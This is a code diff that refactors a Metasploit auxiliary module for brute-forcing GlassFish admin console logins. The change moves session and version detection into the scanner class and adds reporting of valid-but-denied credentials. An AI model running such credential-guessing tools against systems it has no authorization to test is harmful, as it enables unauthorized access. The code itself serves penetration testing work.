@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'metasploit/framework/login_scanner/glassfish'
+require 'metasploit/framework/credential_collection'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -38,8 +39,8 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
+        # There is no TARGETURI because when Glassfish is installed, the path is /
         Opt::RPORT(4848),
-        OptString.new('TARGETURI', [true, 'The URI path of the GlassFish Server', '/']),
         OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
         OptBool.new('SSL', [false, 'Negotiate SSL for outgoing connections', false]),
         OptEnum.new('SSLVersion', [false, 'Specify the version of SSL that should be used', 'TLS1', ['SSL2', 'SSL3', 'TLS1']])
@@ -51,51 +52,10 @@ class Metasploit3 < Msf::Auxiliary
   # the LoginScanner class so the authentication can proceed properly
   #
 
-  def jsession
-    @jsession || ''
-  end
-
-  def set_jsession(res)
-    if res && res.get_cookies =~ /JSESSIONID=(\w*);/i
-      @scanner.jsession = $1
-    end
-  end
-
   # Overrides the ssl method from HttpClient
   def ssl
     @scanner.ssl || datastore['SSL']
   end
-
-  #
-  # Return GlassFish's edition (Open Source or Commercial) and version (2.x, 3.0, 3.1, 9.x, 4.0) and
-  # banner (ex: Sun Java System Application Server 9.x)
-  #
-  def get_version(res)
-    # Extract banner from response
-    banner = res.headers['Server'] || ''
-
-    # Default value for edition and glassfish version
-    edition = 'Commercial'
-    version = 'Unknown'
-
-    # Set edition (Open Source or Commercial)
-    p = /(Open Source|Sun GlassFish Enterprise Server|Sun Java System Application Server)/
-    edition = 'Open Source' if banner =~ p
-
-    # Set version.  Some GlassFish servers return banner "GlassFish v3".
-    if banner =~ /(GlassFish Server|Open Source Edition)[[:blank:]]*(\d\.\d)/
-      version = $2
-    elsif banner =~ /GlassFish v(\d)/ && version.nil?
-      version = $1
-    elsif banner =~ /Sun GlassFish Enterprise Server v2/ && version == 'Unknown'
-      version = '2.x'
-    elsif banner =~ /Sun Java System Application Server 9/ && version == 'Unknown'
-      version = '9.x'
-    end
-
-    return edition, version, banner
-  end
-
 
   #
   # For a while, older versions of Glassfish didn't need to set a password for admin,
@@ -107,14 +67,12 @@ class Metasploit3 < Msf::Auxiliary
 
     if version =~ /^[29]\.x$/
       res = send_request_cgi({'uri'=>'/applications/upload.jsf'})
-      set_jsession(res)
       p = /<title>Deploy Enterprise Applications\/Modules/
       if (res && res.code.to_i == 200 && res.body.match(p) != nil)
         success = true
       end
     elsif version =~ /^3\./
       res = send_request_cgi({'uri'=>'/common/applications/uploadFrame.jsf'})
-      set_jsession(res)
       p = /<title>Deploy Applications or Modules/
       if (res && res.code.to_i == 200 && res.body.match(p) != nil)
         success = true
@@ -139,7 +97,6 @@ class Metasploit3 < Msf::Auxiliary
     @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(
       host:               ip,
       port:               rport,
-      uri:                datastore['URI'],
       proxies:            datastore["PROXIES"],
       cred_details:       @cred_collection,
       stop_on_success:    datastore['STOP_ON_SUCCESS'],
@@ -185,6 +142,10 @@ class Metasploit3 < Msf::Auxiliary
         print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
         do_report(ip, rport, result)
         :next_user
+      when Metasploit::Model::Login::Status::DENIED_ACCESS
+        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}'"
+        do_report(ip, rport, result)
+        :next_user
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
         print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
         invalidate_login(
@@ -215,74 +176,26 @@ class Metasploit3 < Msf::Auxiliary
   end
 
 
-  def init_bruteforce
-    res   = nil
-    tried = false
-
-    begin
-      print_status("Sending a request to /common/index.jsf...")
-      res = send_request_cgi({'uri'=>'/common/index.jsf'})
-      set_jsession(res)
-
-      # Abort if res returns nil due to an exception (broken pipe or timeout)
-      if res.nil?
-        print_error('Unable to get a response from the server.')
-        return
-      end
-
-      # Automatic HTTP to HTTPS transition (when needed)
-      if @scanner.ssl == false && res && res.headers['Location'] =~ /^https:\/\//
-        print_status("Glassfish is asking us to use HTTPS")
-        print_status("SSL option automatically set to: true")
-        print_status("SSL version option automatically set to: #{datastore['SSLVersion']}")
-        @scanner.ssl = true
-        @scanner.ssl_version = datastore['SSLVersion']
-        # Set the SSL options, and let the exception handler to resend the HTTP request
-        # one more time.
-        raise "SSL error"
-      end
-    rescue ::Exception => e
-      # Retry the HTTP request with updated SSL options
-      if e.message == 'SSL error' && tried == false
-        tried = true
-        retry
-      else
-        # Make sure we don't shut other problems up
-        raise e
-      end
-    end
-
-    # A normal client starts with /login.jsf, so we start with /login.jsf
-    if res && res.code.to_i == 302
-      res = send_request_cgi({'uri' => '/login.jsf'})
-      set_jsession(res)
-    end
-
-    res
-  end
-
 
   #
   # main
   #
   def run_host(ip)
     init_loginscanner(ip)
-    res = init_bruteforce
-    edition, version, banner = get_version(res)
-    @scanner.version = version
+    msg = @scanner.check_setup
+    if msg
+      print_brute :level => :error, :ip => rhost, :msg => msg
+      return
+    end
 
-    print_status('Checking if Glassfish requires a password...')
-    if version =~ /^[239]\.x$/ && is_password_required?(version)
+    print_brute :level=>:status, :ip=>rhost, :msg=>('Checking if Glassfish requires a password...')
+    if @scanner.version =~ /^[239]\.x$/ && is_password_required?(@scanner.version)
       print_brute :level => :good, :ip => ip, :msg => "Note: This Glassfish does not require a password"
     else
-      print_status("Glassfish is protected with a password")
+      print_brute :level=>:status, :ip=>rhost, :msg=>("Glassfish is protected with a password")
     end
 
-    begin
-      bruteforce(ip) unless version.blank?
-    rescue ::Metasploit::Framework::LoginScanner::GlassfishError => e
-      print_error(e.message)
-    end
+    bruteforce(ip) unless @scanner.version.blank?
   end
 
 end
